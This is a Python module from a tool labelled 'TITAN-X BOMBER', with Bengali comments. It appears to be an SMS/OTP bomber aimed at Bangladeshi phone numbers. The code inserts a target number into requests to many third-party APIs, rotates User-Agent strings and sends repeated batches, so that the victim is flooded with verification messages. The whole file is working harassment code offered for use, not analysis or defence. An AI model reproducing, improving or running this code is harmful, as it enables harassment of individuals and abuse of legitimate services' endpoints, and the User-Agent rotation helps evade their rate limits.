# api_handler.py
# TITAN-X BOMBER API HANDLER
# Developed by: MAINUL ISLAM

import requests
import json
import time
import random
from utils import get_random_agent

def send_request(api_info, target):
    """API রিকোয়েস্ট পাঠায় - সব ধরণের ডাটা হ্যান্ডেল করে"""
    
    url = api_info['url']
    headers = api_info.get('headers_template', {}).copy()
    headers["User-Agent"] = get_random_agent()
    
    cookies = api_info.get('cookies', {})
    params = api_info.get('params', {})
    
    # নম্বর ফরম্যাট
    number = target
    if api_info.get('number_format') == '0 দিয়ে':
        number = f"0{target}"
    elif api_info.get('number_format') == '880 দিয়ে':
        number = f"880{target}"
    elif api_info.get('number_format') == '+880 দিয়ে':
        number = f"+880{target}"
    
    # ডাটা প্রসেসিং
    raw_data = api_info.get('data', "")
    
    try:
        if isinstance(raw_data, str):
            processed = raw_data.replace("{number}", number)
            # JSON string হলে parse করো
            if processed.startswith(('[', '{')):
                try:
                    processed = json.loads(processed)
                except:
                    pass  # string হিসেবেই থাকুক
        else:
            # dictionary/list
            temp = json.dumps(raw_data)
            temp = temp.replace("{number}", number)
            # random হ্যান্ডেল (Paperfly এর জন্য)
            if "{random}" in temp:
                temp = temp.replace("{random}", str(random.randint(1000, 9999)))
            processed = json.loads(temp)
        
        # রিকোয়েস্ট পাঠান
        method = api_info.get('method', 'POST')
        
        if method.upper() == 'GET':
            r = requests.get(
                url, 
                params=params,
                headers=headers, 
                cookies=cookies,
                timeout=10
            )
        else:
            if api_info.get('data_type') == 'raw':
                r = requests.post(
                    url, 
                    json=processed, 
                    headers=headers, 
                    params=params,
                    cookies=cookies,
                    timeout=10
                )
            else:
                # JSON বা ফর্ম ডাটা
                if isinstance(processed, dict):
                    r = requests.post(
                        url, 
                        data=processed, 
                        headers=headers, 
                        params=params,
                        cookies=cookies,
                        timeout=10
                    )
                else:
                    r = requests.post(
                        url, 
                        data=str(processed), 
                        headers=headers, 
                        params=params,
                        cookies=cookies,
                        timeout=10
                    )
        
        success_codes = api_info.get('success_codes', [200])
        if r.status_code in success_codes:
            return True
        elif r.status_code in [301, 302]:
            return True  # redirect ও OK
        else:
            return False
        
    except Exception as e:
        return False

# ===== send_batch ফাংশন (যা ইম্পোর্ট করতে চাচ্ছ) =====
def send_batch(api_list, target, count=5, delay=0.5):
    """একাধিক API তে রিকোয়েস্ট পাঠায়"""
    success = 0
    failed = 0
    results = []
    
    for i in range(count):
        api = random.choice(api_list)
        status = send_request(api, target)
        
        if status:
            success += 1
            results.append({"api": api['name'], "success": True})
        else:
            failed += 1
            results.append({"api": api['name'], "success": False})
        
        if i < count - 1:
            time.sleep(delay)
    
    return {
        "total": count,
        "success": success,
        "failed": failed,
        "results": results
    }